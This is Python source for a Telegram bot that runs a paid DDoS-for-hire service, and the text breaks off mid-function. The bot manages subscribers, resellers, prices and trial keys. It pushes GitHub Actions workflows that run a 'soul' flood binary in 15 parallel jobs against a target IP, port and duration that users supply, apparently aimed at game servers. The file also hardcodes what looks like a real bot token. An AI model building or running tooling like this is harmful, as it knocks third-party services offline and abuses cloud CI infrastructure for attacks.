import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "8574019554:AAEBQKA_62ksFKsaUw4WgYl5Gm8wkPIY4no"  # REPLACE WITH YOUR ACTUAL BOT TOKEN
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [7723674846, 7723674846]  # Primary owners

# Conversation states
WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6
WAITING_FOR_GROUP_APPROVE = 7
WAITING_FOR_FEEDBACK = 8

# Global variables
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 2000  # Increased to 2000 as requested
user_attack_counts = {}  # Track attack counts per user
user_waiting_for_feedback = {}  # Track users waiting for feedback
group_approvals = {}  # Track group approvals

# Price lists
USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

# ========== DATA LOADING FUNCTIONS ==========
def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_approved_groups():
    try:
        with open('approved_groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_groups(approved_groups):
    with open('approved_groups.json', 'w') as f:
        json.dump(approved_groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 2000)
    except FileNotFoundError:
        return 2000

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

def load_feedback_users():
    try:
        with open('feedback_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_feedback_users(feedback_users):
    with open('feedback_users.json', 'w') as f:
        json.dump(feedback_users, f, indent=2)

# ========== INITIALIZE DATA ==========
authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
approved_groups = load_approved_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()
user_waiting_for_feedback = load_feedback_users()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

# ========== PERMISSION FUNCTIONS ==========
def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            # Remove expired user
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def is_user_in_approved_group(user_id, chat_id=None):
    """Check if user can use bot in this group"""
    if chat_id:
        chat_id_str = str(chat_id)
        if chat_id_str in approved_groups:
            group_info = approved_groups[chat_id_str]
            expiry = group_info.get('expiry')
            if expiry == "LIFETIME":
                return True
            current_time = time.time()
            if current_time < expiry:
                return True
            else:
                # Group approval expired
                del approved_groups[chat_id_str]
                save_approved_groups(approved_groups)
    return False

def can_user_attack(user_id, chat_id=None):
    # Check if user needs to give feedback
    if str(user_id) in user_waiting_for_feedback:
        return False
    
    # Owners, admins, resellers, and approved users can always attack
    if is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id):
        return not MAINTENANCE_MODE
    
    # For group members: only if they're in an approved group AND command is from that group
    if chat_id and is_user_in_approved_group(user_id, chat_id):
        return not MAINTENANCE_MODE
    
    return False

def can_use_in_group(chat_id):
    """Check if bot can be used in this group"""
    chat_id_str = str(chat_id)
    if chat_id_str in approved_groups:
        group_info = approved_groups[chat_id_str]
        expiry = group_info.get('expiry')
        if expiry == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry:
            return True
        else:
            # Group approval expired
            del approved_groups[chat_id_str]
            save_approved_groups(approved_groups)
    return False

def can_start_attack(user_id, chat_id=None):
    global current_attack, cooldown_until
    
    if MAINTENANCE_MODE:
        return False, "⚡ **🚫 𝐁𝐎𝐓 𝐈𝐍 𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄**\n────────────────────\nPlease try again after some time."
    
    # Check if user needs to give feedback
    if str(user_id) in user_waiting_for_feedback:
        return False, "📸 **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃**\n────────────────────\nPlease send a BGMI-related photo to proceed with next attack."
    
    # Check maximum attacks per user
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ **𝐌𝐀𝐗𝐈𝐌𝐔𝐌 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓 𝐑𝐄𝐀𝐂𝐇𝐄𝐃**\n────────────────────\nYou have reached maximum {MAX_ATTACKS} attacks. Please contact admin."
    
    if current_attack is not None:
        return False, "⚠️ **𝐄𝐑𝐑𝐎𝐑: 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐑𝐔𝐍𝐍𝐈𝐍𝐆**\n────────────────────\nPlease wait for current attack to complete."
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ **𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐏𝐄𝐑𝐈𝐎𝐃**\n────────────────────\nPlease wait `{remaining_time}` seconds before starting next attack."
    
    return True, "✅ Ready to start attack"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "✅"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ Invalid IP - IPs starting with '15' or '96' not accepted"
    else:
        return "BGMI FLOOD", "✅"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()
    
    # Increment user attack count
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until
    
    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))
        
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }
    
    return {"status": "ready"}

# ========== GROUP APPROVAL FUNCTIONS ==========
def approve_group(chat_id, days, approved_by):
    chat_id_str = str(chat_id)
    
    # Calculate expiry
    if days == 0:
        expiry = "LIFETIME"
    else:
        expiry = time.time() + (days * 24 * 60 * 60)
    
    approved_groups[chat_id_str] = {
        "approved_by": approved_by,
        "approved_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": days
    }
    save_approved_groups(approved_groups)
    
    return expiry

def remove_group_approval(chat_id):
    chat_id_str = str(chat_id)
    if chat_id_str in approved_groups:
        del approved_groups[chat_id_str]
        save_approved_groups(approved_groups)
        return True
    return False

# ========== FEEDBACK SYSTEM ==========
def require_feedback(user_id):
    user_id_str = str(user_id)
    user_waiting_for_feedback[user_id_str] = {
        "required_at": time.time(),
        "attempts": 0
    }
    save_feedback_users(user_waiting_for_feedback)

def clear_feedback_requirement(user_id):
    user_id_str = str(user_id)
    if user_id_str in user_waiting_for_feedback:
        del user_waiting_for_feedback[user_id_str]
        save_feedback_users(user_waiting_for_feedback)

def is_bgmi_photo(text=None):
    """Check if the message contains BGMI related content"""
    if not text:
        return False
    
    bgmi_keywords = ['bgmi', 'pubg', 'battleground', 'mobile', 'game', 'gaming', 'player', 'chicken', 'winner', 'victory']
    text_lower = text.lower()
    
    for keyword in bgmi_keywords:
        if keyword in text_lower:
            return True
    
    return False

# ========== TRIAL KEY FUNCTIONS ==========
def generate_trial_key(hours):
    # Generate a random key: TRL-XXXX-XXXX-XXXX
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    
    # Calculate expiry
    expiry = time.time() + (hours * 3600)  # hours to seconds
    
    # Store key
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)
    
    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)
    
    if key not in trial_keys:
        return False, "Invalid key"
    
    key_data = trial_keys[key]
    
    if key_data["used"]:
        return False, "Key already used"
    
    if time.time() > key_data["expiry"]:
        return False, "Key expired"
    
    # Mark key as used
    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)
    
    # Add user with trial access
    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)
    
    return True, f"✅ Trial access activated for {key_data['hours']} hours!"

# ========== GITHUB FUNCTIONS ==========
def create_repository(token, repo_name="vc-ddos-bot"):
    try:
        g = Github(token)
        user = g.get_user()
        
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="VC DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]

jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val} 999
"""
    
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"✅ Created configuration for {repo_name}")
        
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        
        return total_cancelled
        
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0

# ========== USER COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Send welcome image
    try:
        await update.message.reply_photo(
            photo="https://files.catbox.moe/0b5tlz.jpg",
            caption="🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 ♝♖ 🇮🇳千𝕃Λ爪乇 🔥🌟\n\n"
                    "🚀 𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!\n"
                    "💥 𝐓𝐡𝐞 𝐖𝐎𝐑𝐋𝐃'𝐒 𝐁𝐄𝐒𝐓 DDOS BOT 🔥\n"
                    "⚡ 𝐁𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆, 𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐄 𝐓𝐇𝐄 𝐖𝐄𝐁!\n"
                    "────────────────────\n"
                    "⚡ Instant 677 Ping\n"
                    "🎯 Fully Working DDoS Bot\n"
                    "🛡️ Premium Protection\n"
                    "🚀 Fast & Reliable Attack\n\n"
                    f"👑 Owner: @{owners.get(str(ADMIN_IDS[0]), {}).get('username', 'Unknown')}\n"
                    "📞 Support: Contact Admin\n"
                    "────────────────────\n"
                    "Use /help for commands list"
        )
    except:
        pass
    
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🔧 **🚫 𝐁𝐎𝐓 𝐈𝐍 𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄**\n"
            "────────────────────\n"
            "Bot is under maintenance.\n"
            "Please try again later."
        )
        return
    
    # Check if this is a private chat (DM)
    if update.effective_chat.type == "private":
        # In DM, only approved users can use the bot
        if not can_user_attack(user_id):
            user_exists = False
            for user in pending_users:
                if str(user['user_id']) == str(user_id):
                    user_exists = True
                    break
            
            if not user_exists:
                pending_users.append({
                    "user_id": user_id,
                    "username": update.effective_user.username or f"user_{user_id}",
                    "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
                })
                save_pending_users(pending_users)
                
                # Notify owners
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            chat_id=int(owner_id),
                            text=f"📩 **𝐍𝐄𝐖 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐄𝐒𝐓**\n────────────────────\nUser: @{update.effective_user.username or 'No username'}\nID: `{user_id}`\nUse /add {user_id} 7 to approve"
                        )
                    except:
                        pass
            
            await update.message.reply_text(
                "📋 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐒𝐄𝐍𝐓**\n"
                "────────────────────\n"
                "Your access request has been sent to admin.\n"
                "Please wait for approval.\n\n"
                "Use /id to get your User ID\n"
                "Use /help for help commands\n\n"
                "🎁 **𝐖𝐀𝐍𝐓 𝐓𝐑𝐈𝐀𝐋?**\n"
                "Ask admin for trial key or use /redeem <key>\n\n"
                "💡 **𝐍𝐎𝐓𝐄:** To use bot in groups, join an approved group!"
            )
            return
    else:
        # This is a group chat
        if not can_use_in_group(chat_id):
            await update.message.reply_text(
                "🚫 **𝐁𝐎𝐓 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏**\n"
                "────────────────────\n"
                "This group is not approved to use CLOUD Bot.\n"
                "Contact admin to get this group approved.\n\n"
                "Admins can use: /approvegroup <group_id> <days>"
            )
            return
    
    attack_status = get_attack_status()
    
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        await update.message.reply_text(
            "⚡ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆**\n"
            "────────────────────\n"
            f"🎯 Target: `{attack['ip']}:{attack['port']}`\n"
            f"⏱️ Time: `{attack_status['elapsed']}s`\n"
            f"⌛ Remaining: `{attack_status['remaining']}s`"
        )
        return
    
    if attack_status["status"] == "cooldown":
        await update.message.reply_text(
            "⏳ **𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍**\n"
            "────────────────────\n"
            f"Please wait `{attack_status['remaining_cooldown']}s`\n"
            "then start attack."
        )
        return
    
    # Determine user role
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑"
        else:
            user_role = "👑 𝐎𝐖𝐍𝐄𝐑"
    elif is_admin(user_id):
        user_role = "🛡️ 𝐀𝐃𝐌𝐈𝐍"
    elif is_reseller(user_id):
        user_role = "💰 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑"
    elif is_approved_user(user_id):
        user_role = "👤 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑"
    elif update.effective_chat.type != "private" and can_use_in_group(chat_id):
        user_role = "👥 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐌𝐁𝐄𝐑"
    else:
        user_role = "⏳ 𝐏𝐄𝐍𝐃𝐈𝐍𝐆"
    
    # Get remaining attacks
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    # Check if in group or DM
    if update.effective_chat.type == "private":
        location = "📱 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐇𝐀𝐓"
    else:
        location = "👥 𝐆𝐑𝐎𝐔𝐏 𝐂𝐇𝐀𝐓"
    
    await update.message.reply_text(
        f"🤖 **𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐔𝐍𝐃𝐄𝐑 𝐁𝐎𝐓** 🤖\n"
        "────────────────────\n"
        f"{user_role} | {location}\n"
        "────────────────────\n\n"
        f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}/{MAX_ATTACKS}\n\n"
        "📋 **𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:**\n"
        "────────────────────\n"
        "• /attack <ip> <port> <time> - Start attack\n"
        "• /status - Check attack status\n"
        "• /stop - Stop attack\n"
        "• /id - Get your User ID\n"
        "• /myaccess - Check your access\n"
        "• /help - View help menu\n"
        "• /redeem <key> - Redeem trial key\n"
        "────────────────────\n\n"
        "📢 **𝐑𝐔𝐋𝐄𝐒:**\n"
        f"• Only 1 attack at a time\n"
        f"• {COOLDOWN_DURATION} seconds cooldown after attack\n"
        f"• Invalid IPs: '15', '96'"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Check if user is in an approved group
    in_approved_group = can_use_in_group(chat_id) if update.effective_chat.type != "private" else False
    
    if is_owner(user_id) or is_admin(user_id) or is_reseller(user_id):
        await update.message.reply_text(
            "📚 **𝐇𝐄𝐋𝐏 - 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒**\n"
            "────────────────────\n"
            "**𝐅𝐎𝐑 𝐀𝐋𝐋 𝐔𝐒𝐄𝐑𝐒:**\n"
            "• /attack <ip> <port> <time>\n"
            "• /status - Check status\n"
            "• /stop - Stop attack\n"
            "• /id - Get your ID\n"
            "• /myaccess - Check access\n"
            "• /help - This menu\n"
            "• /redeem <key> - Redeem key\n\n"
            "**𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:**\n"
            "• /admin - View all admin commands\n"
            "────────────────────\n"
            "**𝐍𝐄𝐄𝐃 𝐌𝐎𝐑𝐄 𝐇𝐄𝐋𝐏?** Contact admin."
        )
    elif can_user_attack(user_id, chat_id) or in_approved_group:
        await update.message.reply_text(
            "📚 **𝐇𝐄𝐋𝐏 - 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒**\n"
            "────────────────────\n"
            "• /attack <ip> <port> <time>\n"
            "• /status - Check status\n"
            "• /stop - Stop attack\n"
            "• /id - Get your ID\n"
            "• /myaccess - Check access\n"
            "• /help - This menu\n"
            "• /redeem <key> - Redeem key\n"
            "────────────────────\n"
            "**𝐍𝐄𝐄𝐃 𝐌𝐎𝐑𝐄 𝐇𝐄𝐋𝐏?** Contact admin."
        )
    else:
        # For non-approved users in DMs
        if update.effective_chat.type == "private":
            await update.message.reply_text(
                f"📚 **𝐇𝐄𝐋𝐏**\n"
                "────────────────────\n"
                "• /id - Get your User ID\n"
                "• /help - This menu\n"
                "• /redeem <key> - Redeem trial key\n\n"
                "**𝐓𝐎 𝐆𝐄𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐈𝐍 𝐃𝐌:**\n"
                "1. Use /start\n"
                "2. Wait for admin\n"
                "3. Attack after approval\n\n"
                "**𝐓𝐎 𝐔𝐒𝐄 𝐈𝐍 𝐆𝐑𝐎𝐔𝐏:**\n"
                "1. Join an approved group\n"
                "2. Use bot directly in group\n"
                "────────────────────\n"
                f"**𝐘𝐎𝐔𝐑 𝐈𝐃:** `{user_id}`"
            )
        else:
            # For non-approved groups
            await update.message.reply_text(
                "🚫 **𝐁𝐎𝐓 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏**\n"
                "────────────────────\n"
                "This group is not approved to use CLOUD Bot.\n"
                "Contact admin to get this group approved.\n\n"
                "**𝐆𝐑𝐎𝐔𝐏 𝐈𝐃:** `" + str(chat_id) + "`\n"
                "Send this ID to admin for approval."
            )

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    chat_id = update.effective_chat.id
    
    if update.effective_chat.type != "private":
        # In group, show group ID too
        await update.message.reply_text(
            f"🆔 **𝐈𝐃 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍**\n"
            "────────────────────\n"
            f"• **𝐘𝐨𝐮𝐫 𝐔𝐬𝐞𝐫 𝐈𝐃:** `{user_id}`\n"
            f"• **𝐘𝐨𝐮𝐫 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:** @{username}\n"
            f"• **𝐆𝐫𝐨𝐮𝐩 𝐈𝐃:** `{chat_id}`\n"
            "────────────────────\n"
            "Send Group ID to admin for approval."
        )
    else:
        # In DM
        await update.message.reply_text(
            f"🆔 **𝐘𝐎𝐔𝐑 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍**\n"
            "────────────────────\n"
            f"• **𝐔𝐬𝐞𝐫 𝐈𝐃:** `{user_id}`\n"
            f"• **𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:** @{username}\n"
            "────────────────────\n"
            "Send this ID to admin for access."
        )

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if is_owner(user_id):
        if is_primary_owner(user_id):
            role = "👑 𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑"
        else:
            role = "👑 𝐎𝐖𝐍𝐄𝐑"
        expiry = "LIFETIME"
    elif is_admin(user_id):
        role = "🛡️ 𝐀𝐃𝐌𝐈𝐍"
        expiry = "LIFETIME"
    elif is_reseller(user_id):
        role = "💰 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    elif is_approved_user(user_id):
        role = "👤 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    else:
        role = "⏳ 𝐏𝐄𝐍𝐃𝐈𝐍𝐆"
        expiry = "Waiting for approval"
    
    # Get remaining attacks
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    # Check group access
    group_access = "❌ 𝐍𝐎"
    if update.effective_chat.type != "private":
        if can_use_in_group(chat_id):
            group_info = approved_groups.get(str(chat_id), {})
            expiry_group = group_info.get('expiry', '?')
            if expiry_group == "LIFETIME":
                group_access = "✅ 𝐘𝐄𝐒 (LIFETIME)"
            else:
                try:
                    expiry_time = float(expiry_group)
                    if time.time() > expiry_time:
                        group_access = "❌ 𝐄𝐗𝐏𝐈𝐑𝐄𝐃"
                    else:
